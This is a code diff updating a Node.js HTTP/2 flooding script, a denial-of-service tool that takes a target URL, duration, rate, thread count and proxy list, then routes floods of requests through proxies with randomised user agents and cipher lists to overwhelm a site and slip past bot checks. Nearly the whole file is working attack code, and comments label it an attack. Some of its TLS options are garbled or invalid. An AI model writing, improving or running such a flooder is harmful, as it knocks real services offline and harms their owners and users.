@@ -1,104 +1,78 @@
- const net = require("net");
+const net = require("net");
  const http2 = require("http2");
  const tls = require("tls");
  const cluster = require("cluster");
  const url = require("url");
  const crypto = require("crypto");
+ const UserAgent = require('user-agents');
  const fs = require("fs");
- const gradient = require ("gradient-string");
  
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
+ process.on('uncaughtException', function (exception) {
+  });
 
- if (process.argv.length < 5){console.log(gradient.vice(`[!] node TLS.js <HOST> <TIME> <RPS> <THREADS>.`));; process.exit();}
- 
- const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
- const ciphers = "GREASE:" + [
-     defaultCiphers[2],
-     defaultCiphers[1],
-     defaultCiphers[0],
-     ...defaultCiphers.slice(3)
- ].join(":");
- 
- const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
- 
- const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
- 
- const secureOptions = 
- crypto.constants.SSL_OP_NO_SSLv2 |
- crypto.constants.SSL_OP_NO_SSLv3 |
- crypto.constants.SSL_OP_NO_TLSv1 |
- crypto.constants.SSL_OP_NO_TLSv1_1 |
- crypto.constants.ALPN_ENABLED |
- crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
- crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
- crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
- crypto.constants.SSL_OP_COOKIE_EXCHANGE |
- crypto.constants.SSL_OP_PKCS1_CHECK_1 |
- crypto.constants.SSL_OP_PKCS1_CHECK_2 |
- crypto.constants.SSL_OP_SINGLE_DH_USE |
- crypto.constants.SSL_OP_SINGLE_ECDH_USE |
- crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
- 
- const secureProtocol = "TLS_client_method";
+ if (process.argv.length < 7){
+	 console.log(`
+  Usage: node TLSV2.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]`); 
+	 process.exit();}
  const headers = {};
+  function readLines(filePath) {
+     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+ }
  
- const secureContextOptions = {
-     ciphers: ciphers,
-     sigalgs: sigalgs,
-     honorCipherOrder: true,
-     secureOptions: secureOptions,
-     secureProtocol: secureProtocol
- };
+ function randomIntn(min, max) {
+     return Math.floor(Math.random() * (max - min) + min);
+ }
  
- const secureContext = tls.createSecureContext(secureContextOptions);
- 
- var proxyFile = "proxy.txt";
- var proxies = readLines(proxyFile);
- var userAgents = readLines("ua.txt");
+ function randomElement(elements) {
+     return elements[randomIntn(0, elements.length)];
+ } 
  
  const args = {
      target: process.argv[2],
      time: ~~process.argv[3],
      Rate: ~~process.argv[4],
-     threads: ~~process.argv[5]
+     threads: ~~process.argv[5],
+     proxyFile: process.argv[6]
  }
- 
+ const cplist = [ // Captcha Solve by Ibaaall 10-04-2023
+     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
+ ];
+ var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
+ var proxies = readLines(args.proxyFile);
  const parsedTarget = url.parse(args.target);
 
  if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
-        //console.log("Threads " + counter +  " started.");
         cluster.fork();
     }
-} else {for (let i = 0; i < 120; i++) { setInterval(runFlooder, 0) }}
+} else {setInterval(runFlooder) }
  
  class NetSocket {
      constructor(){}
  
   HTTP(options, callback) {
-     const parsedAddr = options.address.split(":");
+     const parsedAddr = options.address.split(":"); // Socket Connection Fixed by Ibaaall 27-03-2023
      const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
+     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
      const buffer = new Buffer.from(payload);
  
      const connection = net.connect({
          host: options.host,
-         port: options.port,
-         allowHalfOpen: true,
-         writable: true,
-         readable: true
+         port: options.port
      });
  
-     connection.setTimeout(options.timeout * 100000);
+     connection.setTimeout(options.timeout * 10000);
      connection.setKeepAlive(true, 100000);
-     connection.setNoDelay(true)
  
      connection.on("connect", () => {
          connection.write(buffer);
      });
  
-     connection.on("data", chunk => {
+     connection.on("data", chunk => { //HTTP Version Fixed by Ibaaall 08-04-2023
          const response = chunk.toString("utf-8");
          const isAlive = response.includes("HTTP/1.1 200");
          if (isAlive === false) {
@@ -120,114 +94,86 @@
  }
  }
 
- const Socker = new NetSocket();
- 
- function readLines(filePath) {
-     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
- }
- 
- function randomIntn(min, max) {
-     return Math.floor(Math.random() * (max - min) + min);
- }
- 
- function randomElement(elements) {
-     return elements[randomIntn(0, elements.length)];
- }
- 
- function randomCharacters(length) {
-     output = ""
-     for (let count = 0; count < length; count++) {
-         output += randomElement(characters);
-     }
-     return output;
- }
- 
+ const Socker = new NetSocket(); // Socket GET Fixed
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
- headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
- headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
- headers["accept-encoding"] = "gzip, deflate, br";
- headers["x-forwarded-proto"] = "https";
- headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
- headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
- headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-site"] = "same-origin";
- headers["upgrade-insecure-requests"] = "1";
+ headers["accept"] = "/";
+ headers["accept-language"] = "en-US,en;q=0.9";
+ headers["accept-encoding"] = "gzip, deflate";
+ headers["cache-control"] = "no-cache";
+ headers["upgrade-insecure-requests"] = "1"; 
  
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
- 
-     /** headers dynamic */
+     const userAgentv2 = new UserAgent();
+     var useragent = userAgentv2.toString();
      headers[":authority"] = parsedTarget.host
-     headers["user-agent"] = randomElement(userAgents);
-     headers["x-forwarded-for"] = parsedProxy[0];
+     headers["user-agent"] = useragent;
  
      const proxyOptions = {
          host: parsedProxy[0],
          port: ~~parsedProxy[1],
          address: parsedTarget.host + ":443",
-         timeout: 15
+         timeout: 3
      };
 
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 600000);
-         connection.setNoDelay(true)
- 
-         const settings = {
-             enablePush: false,
-             initialWindowSize: 1073741823
-         };
+         connection.setKeepAlive(true, 100000);
 
          const tlsOptions = {
-            port: 443,
-            secure: true,
-            ALPNProtocols: [
-                "h2"
-            ],
-            ciphers: ciphers,
-            sigalgs: sigalgs,
-            requestCert: true,
+            ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'], // Protocol List ketika ATTACK
+            challengesToSolve: Infinity,
+            followAllRedirects: true,
+            clientTimeout: Infinity,
+            clientlareMaxTimeout: Infinity,
+            maxRedirects: Infinity,
+            ciphers: cipper,
+            servername: url.hostname,
             socket: connection,
-            ecdhCurve: ecdhCurve,
-            honorCipherOrder: false,
-            host: parsedTarget.host,
+            honorCipherOrder: true,
+            echdCurve: "GREASE:X25519:x25519",
+            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+            secure: true,
             rejectUnauthorized: false,
-            clientCertEngine: "dynamic",
-            secureOptions: secureOptions,
-            secureContext: secureContext,
+            port: 80,
+            uri: parsedTarget.host,
             servername: parsedTarget.host,
-            secureProtocol: secureProtocol
         };
 
          const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
 
-         tlsConn.allowHalfOpen = true;
-         tlsConn.setNoDelay(true);
-         tlsConn.setKeepAlive(true, 60 * 1000);
-         tlsConn.setMaxListeners(0);
+         tlsConn.setKeepAlive(true, 10 * 10000);
  
          const client = http2.connect(parsedTarget.href, {
              protocol: "https:",
-             settings: settings,
-             maxSessionMemory: 655000,
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 262144,
+            enablePush: false
+          },
+             maxSessionMemory: 3333,
              maxDeflateDynamicTableSize: 4294967295,
-             createConnection: () => tlsConn
-             //socket: connection,
+             createConnection: () => tlsConn,
+             socket: connection,
          });
  
-         client.setMaxListeners(0);
-         client.settings(settings);
+         client.settings({
+            headerTableSize: 65536,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 262144,
+            enablePush: false
+          });
  
          client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                     const request = client.request(headers)
                     
                     .on("response", response => {
@@ -254,10 +200,7 @@
          });
      });
  }
- console.log(gradient.vice(`[!] Attack successfully sent to target: ${args.target}`));
- const KillScript = () => process.exit(1);
+ 
+ const KillScript = () => process.exit(1); // Auto Stop ketika Durasi habis
  
  setTimeout(KillScript, args.time * 1000);
- 
- process.on('uncaughtException', error => {});
- process.on('unhandledRejection', error => {});
